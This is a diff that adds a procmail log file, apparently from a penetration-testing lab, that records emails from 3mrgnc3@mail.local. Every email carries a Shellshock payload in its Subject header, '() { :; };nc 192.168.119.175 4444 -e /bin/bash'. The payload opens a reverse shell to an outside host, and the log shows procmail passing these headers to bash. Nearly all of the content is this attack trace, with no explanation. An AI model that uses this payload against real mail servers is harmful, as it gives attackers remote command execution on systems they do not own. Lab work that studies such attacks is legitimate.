@@ -1,0 +1,39 @@
+
+procmail: Executing "formail,-xSubject:"
+procmail: Assigning "SUBJECT=() { :; };nc 192.168.119.175 4444 -e /bin/bash"
+procmail: Executing "formail,-rt,-xTo:"
+procmail: Assigning "FROM= 3mrgnc3@mail.local"
+procmail: Match on ! "^From:.offsec\.com"
+procmail: Couldn't determine implicit lockfile from " (formail) | $SENDMAIL -t -oi"
+procmail: Locking ".lock"
+procmail: Executing " (formail) | $SENDMAIL -t -oi"
+procmail: [3100] Sat Mar 20 14:45:44 2021
+procmail: Non-zero exitcode (-11) from " (formail) | $SENDMAIL -t -oi"
+procmail: Assigning "LASTFOLDER= (formail) | $SENDMAIL -t -oi"
+procmail: Unlocking ".lock"
+procmail: Assigning "security"
+procmail: Assigning "LASTFOLDER=/home/useradm/Maildir/new/1616265921.3100_1.mailman"
+procmail: Notified comsat: "useradm@0:/home/useradm/Maildir/new/1616265921.3100_1.mailman"
+From 3mrgnc3@mail.local  Sat Mar 20 14:45:21 2021
+ Subject:() { :; };nc 192.168.119.175 4444 -e /bin/bash
+  Folder: /home/useradm/Maildir/new/1616265921.3100_1.mailman		    388
+procmail: Executing "formail,-xSubject:"
+procmail: Assigning "SUBJECT=() { :; };nc 192.168.119.175 4444 -e /bin/bash"
+procmail: Executing "formail,-rt,-xTo:"
+procmail: Assigning "FROM= 3mrgnc3@mail.local"
+procmail: Match on ! "^From:.offsec\.com"
+procmail: Couldn't determine implicit lockfile from " (formail) | $SENDMAIL -t -oi"
+procmail: Locking ".lock"
+procmail: Executing " (formail) | $SENDMAIL -t -oi"
+bash: line 6: ks: command not found
+procmail: [3176] Sat Mar 20 15:05:06 2021
+procmail: Timeout, terminating " (formail) | $SENDMAIL -t -oi"
+procmail: Non-zero exitcode (-15) from " (formail) | $SENDMAIL -t -oi"
+procmail: Assigning "LASTFOLDER= (formail) | $SENDMAIL -t -oi"
+procmail: Unlocking ".lock"
+procmail: Assigning "security"
+procmail: Assigning "LASTFOLDER=/home/useradm/Maildir/new/1616266146.3176_1.mailman"
+procmail: Notified comsat: "useradm@0:/home/useradm/Maildir/new/1616266146.3176_1.mailman"
+From 3mrgnc3@mail.local  Sat Mar 20 14:49:06 2021
+ Subject:() { :; };nc 192.168.119.175 4444 -e /bin/bash
+  Folder: /home/useradm/Maildir/new/1616266146.3176_1.mailman		    388
